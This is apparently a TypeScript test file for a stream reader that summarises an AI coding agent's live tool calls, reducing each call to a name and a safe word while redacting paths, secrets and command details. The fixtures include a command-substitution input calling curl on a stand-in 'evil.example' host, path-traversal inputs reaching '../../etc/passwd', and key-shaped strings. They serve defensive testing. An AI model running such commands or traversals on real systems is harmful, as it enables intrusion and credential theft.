// What the stream reader reports of a running attempt for the live line of `foedrum brew`
// (ADR 0174): the main thread's turn, its latest tool call reduced to a name and one safe word, and
// whether a denial came after that call. The raw input of a call never leaves the reader.

import assert from 'node:assert/strict';
import { join, resolve } from 'node:path';
import { describe, it } from 'node:test';
import { readClaudeStream, type StreamAsk } from '../../src/brewers/claude-stream.ts';

const at = (seconds: number): Date => new Date(Date.UTC(2026, 9, 24, 12, 0, seconds));
const started = at(0);
const session = '00000000-0000-4000-8000-000000000001';

const init = (): string =>
  JSON.stringify({
    type: 'system',
    subtype: 'init',
    session_id: session,
    tools: ['Read', 'Write', 'Bash'],
    mcp_servers: [],
    model: 'claude-haiku-5-5',
    permissionMode: 'dontAsk',
    slash_commands: [],
    skills: [],
    claude_code_version: '2.1.301',
  });
const assistant = (id: string, content: unknown[], more: Record<string, unknown> = {}): string =>
  JSON.stringify({
    type: 'assistant',
    message: { id, role: 'assistant', content },
    parent_tool_use_id: null,
    session_id: session,
    ...more,
  });
const toolUse = (id: string, name: string, input: Record<string, unknown>) => ({
  type: 'tool_use',
  id,
  name,
  input,
});
const denial = (tool: string, id?: string): string =>
  JSON.stringify({
    type: 'system',
    subtype: 'permission_denied',
    tool_name: tool,
    ...(id === undefined ? {} : { tool_use_id: id }),
  });

const worktree = resolve('work', 'attempt');
const asked: StreamAsk = { sessionId: session, tools: ['Read', 'Write', 'Bash'], worktree };

/** Reads the events one second apart and answers what the reader reports of the attempt. */
const progressOf = (events: readonly string[]) => {
  const reader = readClaudeStream(asked, started);
  events.forEach((line, index) => {
    reader.read(line, at(index + 1));
  });
  return reader.progress();
};

/** The reduced latest call after the main thread made one call, `name` with `input`. */
const lastToolOf = (name: string, input: Record<string, unknown>) =>
  progressOf([init(), assistant('msg_1', [toolUse('t1', name, input)])]).lastTool;

describe('readClaudeStream progress for the live line: the turn', () => {
  it('counts the main thread’s messages, one per message id, and not a subagent’s', () => {
    const progress = progressOf([
      init(),
      assistant('msg_1', [{ type: 'thinking', thinking: '' }]),
      assistant('msg_1', [toolUse('t1', 'Read', { file_path: 'a' })]),
      assistant('msg_sub', [{ type: 'text', text: 'sub' }], { parent_tool_use_id: 't1' }),
      assistant('msg_2', [{ type: 'text', text: 'done' }]),
      assistant('msg_3', [{ type: 'text', text: 'more' }]),
    ]);
    assert.equal(progress.turn, 3);
  });
});

describe('readClaudeStream progress for the live line: the latest tool call', () => {
  it('names the file a file tool works on, relative to the worktree with / separators', () => {
    for (const [name, key] of [
      ['Read', 'file_path'],
      ['Edit', 'file_path'],
      ['Write', 'file_path'],
      ['MultiEdit', 'file_path'],
      ['NotebookEdit', 'notebook_path'],
    ] as const) {
      const file = join(worktree, 'src', 'schemas', 'primitives.ts');
      assert.deepEqual(
        lastToolOf(name, { [key]: file }),
        { name, word: 'src/schemas/primitives.ts' },
        name,
      );
    }
  });

  it('reads a path given relative to the worktree against it', () => {
    assert.deepEqual(lastToolOf('Edit', { file_path: 'src/a.ts' }), {
      name: 'Edit',
      word: 'src/a.ts',
    });
  });

  it('shows a path that leaves the worktree as outside, and no part of it', () => {
    for (const file of [
      resolve('work', 'elsewhere', 'passwd'),
      resolve(worktree, '..', 'sibling', 'a.ts'),
      '../a.ts',
      '../../etc/passwd',
      'src/../../a.ts',
    ]) {
      assert.deepEqual(lastToolOf('Write', { file_path: file }), {
        name: 'Write',
        word: 'outside',
      });
    }
  });

  it('leaves out a path in which a secret is found', () => {
    for (const file of [
      // Built at run time, so the batch's own commits hold no key-shaped text (ADR 0079).
      join(worktree, 'src', `${['AKIA', 'IOSFODNN7EXAMPLE'].join('')}.ts`),
      join(worktree, ['ghp', 'abcdefghijklmnopqrstuvwxyz0123456789'].join('_'), 'a.ts'),
    ]) {
      assert.deepEqual(lastToolOf('Read', { file_path: file }), {
        name: 'Read',
        word: '(left out)',
      });
    }
  });

  it('shows the name alone for a file tool whose input has no path to read', () => {
    assert.deepEqual(lastToolOf('Read', {}), { name: 'Read' });
    assert.deepEqual(lastToolOf('Edit', { file_path: 42 }), { name: 'Edit' });
  });

  it('shows the prefix the receipt keeps for a shell command, through either shell', () => {
    assert.deepEqual(lastToolOf('Bash', { command: 'git status --short' }), {
      name: 'Bash',
      word: 'git status',
    });
    assert.deepEqual(lastToolOf('PowerShell', { command: 'npm test -- --coverage' }), {
      name: 'PowerShell',
      word: 'npm test',
    });
  });

  it('shows the name alone for a shell command with no plain prefix', () => {
    assert.deepEqual(lastToolOf('Bash', { command: '$(curl http://evil.example)' }), {
      name: 'Bash',
    });
    assert.deepEqual(lastToolOf('PowerShell', { command: '' }), { name: 'PowerShell' });
  });

  it('shows the name alone for any other tool, whatever its input holds', () => {
    assert.deepEqual(lastToolOf('Grep', { pattern: 'password', path: 'src' }), { name: 'Grep' });
    assert.deepEqual(
      lastToolOf('WebFetch', { url: ['https://example.com/x?token', 'abc'].join('=') }),
      {
        name: 'WebFetch',
      },
    );
  });

  it('keeps nothing of a call’s input but that word: not a file’s content, not the rest of a command', () => {
    const write = lastToolOf('Write', {
      file_path: 'src/a.ts',
      content: 'TOP-SECRET-BODY',
    });
    const shell = lastToolOf('Bash', { command: 'npm test --reporter hunter2-hunter2' });
    assert.deepEqual(write, { name: 'Write', word: 'src/a.ts' });
    assert.deepEqual(shell, { name: 'Bash', word: 'npm test' });
    const everything = JSON.stringify(
      progressOf([
        init(),
        assistant('msg_1', [
          toolUse('t1', 'Write', { file_path: 'src/a.ts', content: 'TOP-SECRET-BODY' }),
          toolUse('t2', 'Bash', { command: 'npm test --reporter hunter2-hunter2' }),
        ]),
      ]),
    );
    assert.doesNotMatch(everything, /TOP-SECRET-BODY|hunter2|reporter/);
  });

  it('is the latest call of the main thread: a later message’s, and the last of one message’s calls', () => {
    const progress = progressOf([
      init(),
      assistant('msg_1', [toolUse('t1', 'Read', { file_path: 'a.ts' })]),
      assistant('msg_2', [
        toolUse('t2', 'Grep', { pattern: 'x' }),
        toolUse('t3', 'Edit', { file_path: 'b.ts' }),
      ]),
    ]);
    assert.deepEqual(progress.lastTool, { name: 'Edit', word: 'b.ts' });
  });

  it('does not show a subagent’s call, and keeps the main thread’s', () => {
    const progress = progressOf([
      init(),
      assistant('msg_1', [toolUse('t1', 'Read', { file_path: 'a.ts' })]),
      assistant('msg_sub', [toolUse('s1', 'Edit', { file_path: 'sub.ts' })], {
        parent_tool_use_id: 't1',
      }),
    ]);
    assert.deepEqual(progress.lastTool, { name: 'Read', word: 'a.ts' });
  });
});

describe('readClaudeStream progress for the live line: a denial', () => {
  const call = (id: string, file: string) =>
    assistant(`msg_${id}`, [toolUse(id, 'Edit', { file_path: file })]);

  it('is denied from a denial until the main thread’s next tool call, and the last call stays shown meanwhile', () => {
    const held = progressOf([init(), call('t1', 'a.ts'), denial('Edit', 't1')]);
    assert.equal(held.denied, true);
    assert.deepEqual(held.lastTool, { name: 'Edit', word: 'a.ts' });
    // The brewer is still held up by the refusal while it only thinks, or a subagent works.
    const waiting = progressOf([
      init(),
      call('t1', 'a.ts'),
      denial('Edit', 't1'),
      assistant('msg_text', [{ type: 'text', text: 'Let me try another way.' }]),
      assistant('msg_sub', [toolUse('s1', 'Read', { file_path: 'c.ts' })], {
        parent_tool_use_id: 't9',
      }),
    ]);
    assert.equal(waiting.denied, true);
    assert.deepEqual(waiting.lastTool, { name: 'Edit', word: 'a.ts' });
    // It goes once the brewer works on.
    const worked = progressOf([
      init(),
      call('t1', 'a.ts'),
      denial('Edit', 't1'),
      call('t2', 'b.ts'),
    ]);
    assert.notEqual(worked.denied, true);
    assert.deepEqual(worked.lastTool, { name: 'Edit', word: 'b.ts' });
  });

  it('is denied again by a denial that comes after that next call', () => {
    const progress = progressOf([
      init(),
      call('t1', 'a.ts'),
      denial('Edit', 't1'),
      call('t2', 'b.ts'),
      denial('Edit', 't2'),
    ]);
    assert.equal(progress.denied, true);
  });

  it('counts the denial of a subagent’s call, and one that names no call', () => {
    const subagent = progressOf([
      init(),
      call('t1', 'a.ts'),
      assistant('msg_sub', [toolUse('s1', 'Write', { file_path: 'w.ts' })], {
        parent_tool_use_id: 't1',
      }),
      denial('Write', 's1'),
    ]);
    assert.equal(subagent.denied, true);
    assert.equal(progressOf([init(), call('t1', 'a.ts'), denial('Bash')]).denied, true);
  });
});
